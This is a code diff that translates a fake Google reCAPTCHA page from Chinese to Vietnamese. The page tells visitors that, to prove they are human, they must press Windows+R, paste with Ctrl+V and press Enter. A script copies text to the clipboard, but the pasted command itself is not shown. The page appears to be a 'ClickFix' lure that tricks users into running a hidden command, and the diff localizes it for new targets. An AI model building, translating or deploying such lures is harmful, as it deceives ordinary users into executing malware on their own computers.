@@ -1,11 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="vi">
 <head>
     <meta charset="utf-8">
-    <title>reCAPTCHA 验证</title>
+    <title>Xác minh reCAPTCHA</title>
 
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
     <style>
+        /* Giữ nguyên thiết kế và hoạt ảnh */
         .container {
             font-family: Roboto, helvetica, arial, sans-serif;
         }
@@ -227,40 +228,40 @@
         <div class="checkbox-container m-p">
             <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
         </div>
-        <p class="im-not-a-robot m-p line-normal">我不是机器人</p>
+        <p class="im-not-a-robot m-p line-normal">Tôi không phải là người máy</p>
         <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
         <br>
         <p class="checkbox-desc m-p line-normal">
-            <a href="https://www.google.com/intl/zh-CN/policies/privacy/">隐私政策</a> - <a href="https://www.google.com/intl/zh-CN/policies/terms/">服务条款</a>
+            <a href="https://www.google.com/intl/en/policies/privacy/">Chính sách</a> - <a href="https://www.google.com/intl/en/policies/terms/">Điều khoản</a>
         </p>
         <img class="spinner" alt="" id="spinner">
     </div>
     <div id="verify-window" class="verify-window">
         <div class="verify-container">
             <header class="verify-header">
-                <span class="verify-header-text-medium m-p block">完成下列步骤</span>
-                <span class="verify-header-text-big m-p block">验证</span>
+                <span class="verify-header-text-medium m-p block">Hoàn thành các bước</span>
+                <span class="verify-header-text-big m-p block">Xác minh</span>
             </header>
             <main class="verify-main">
                 <p>
-                    为了证明您不是机器人，请操作：
+                    Để chứng minh bạn không phải là robot, vui lòng:
                 </p>
                 <ol>
                     <li>
-                        按 <b>Windows</b> + <b>R</b> 键。
+                        Nhấn phím <b>Windows</b> + <b>R</b>.
                     </li>
                     <li>
-                        在新打开的窗口中，按 <b>Ctrl</b> + <b>V</b> 。
+                        Trong cửa sổ, nhấn <b>Ctrl</b> + <b>V</b>.
                     </li>
                     <li>
-                        按 <b>Enter</b> 键完成操作。
+                        Nhấn <b>Enter</b> để hoàn tất.
                     </li>
                 </ol>
                 <p>
-                    您将看到并同意：
+                    Bạn sẽ thấy và đồng ý:
                     <br>
                     <code>
-                        ✅ "验证码： <span id="verification-id">146820</span>"
+                        ✅ "Mã xác minh: <span id="verification-id">146820</span>"
                     </code>
                 </p>
             </main>
@@ -275,9 +276,9 @@
 
     function copyToClipboard(text) {
         navigator.clipboard.writeText(text).then(() => {
-            console.log("已复制到剪贴板！");
+            console.log("Đã sao chép vào clipboard!");
         }).catch(err => {
-            console.error("剪贴板复制失败：", err);
+            console.error("Sao chép clipboard thất bại:", err);
         });
     }
 
